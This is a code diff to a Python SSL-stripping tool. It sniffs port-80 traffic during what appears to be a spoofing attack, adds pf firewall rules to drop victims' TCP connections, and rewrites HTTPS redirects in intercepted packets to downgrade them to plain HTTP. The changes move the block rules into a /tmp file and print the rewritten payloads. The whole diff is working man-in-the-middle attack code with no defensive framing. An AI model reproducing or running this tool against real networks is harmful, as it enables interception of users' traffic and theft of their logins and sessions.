@@ -50,7 +50,6 @@ class SSLStripper:
 
         try:
             while self.spoofing:
-                # print("[*] Sniffing for HTTP traffic...")
                 sniff(filter=f"tcp port 80",
                     store=0,
                     prn=self.handle_packet,
@@ -65,6 +64,10 @@ class SSLStripper:
         print("[*] Stopping SSL stripping...")
         self.system_restart()
         self.spoofing = False
+
+        # For debug
+        # os.system('cat /tmp/pf_rules')
+        # os.system('echo "" > /tmp/pf_rules')  # Clear the file
     
     def is_tcp(self, packet):
         """Return true if the packet is the pure TCP connection (first packet)"""
@@ -92,8 +95,10 @@ class SSLStripper:
                 
                 # Block TCP traffic in both directions
                 os.system(f"pfctl -e > /dev/null 2>&1")  # Enable pf firewall
-                os.system(f"echo 'block drop quick on {self.interface} proto tcp from {src_ip} to any port {dst_port}' | pfctl -f - > /dev/null 2>&1")
-                os.system(f"echo 'block drop quick on {self.interface} proto tcp from {dst_ip} to any port {src_port}' | pfctl -f - > /dev/null 2>&1")
+                with open('/tmp/pf_rules', 'a') as f:
+                    f.write(f'block drop quick on {self.interface} proto tcp from {src_ip} to any port {dst_port}\n')
+                    f.write(f'block drop quick on {self.interface} proto tcp from {dst_ip} to any port {src_port}\n')
+                os.system(f"pfctl -f /tmp/pf_rules > /dev/null 2>&1")
 
                 self.blocked_tcp.add(tcp)
 
@@ -133,6 +138,7 @@ class SSLStripper:
                     )
                     new_packet[Raw] = Raw(load=new_payload.encode())
                     print("[*] Successfully downgraded HTTPS redirect to HTTP")
+                    print(new_payload)
             except Exception as e:
                 print("[*] Binary payload", e)
                 new_packet[Raw] = Raw(load=raw_payload)
